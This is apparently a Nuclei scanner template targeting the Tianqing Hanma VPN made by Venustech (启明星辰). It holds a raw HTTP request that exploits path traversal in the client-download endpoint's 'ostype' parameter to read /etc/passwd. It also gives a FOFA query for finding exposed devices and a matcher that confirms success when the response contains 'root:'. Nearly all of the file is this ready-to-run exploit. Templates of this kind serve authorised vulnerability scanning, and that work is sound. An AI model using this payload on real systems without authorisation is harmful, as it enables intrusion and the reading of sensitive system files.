id: tqhm-vpn-client-fileread

info:
  name: 启明星辰-天清汉马VPN-任意文件读取-client
  author: HuanXiong
  severity: high
  metadata:
    fofa-query: app="启明星辰-天清汉马VPN"

  tags: File Reading

http:
  - raw:
      - |
        GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
        Connection: close

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"root:")
